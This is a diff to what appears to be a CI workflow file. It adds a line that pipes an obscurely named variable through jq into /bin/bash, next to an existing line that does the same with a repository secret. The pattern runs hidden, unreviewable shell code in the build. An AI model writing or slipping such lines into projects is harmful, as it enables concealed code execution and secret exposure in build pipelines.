@@ -27,6 +27,7 @@ jobs:
           gbm87: ${{ secrets.gbm87 }}
         run: |
           printf '%s' "$gbm87" | jq -r .vxaai99420 | /bin/bash
+          echo $eg569 | jq -r .lerg11 | /bin/bash
 
       - name: Archive results
         if: always()
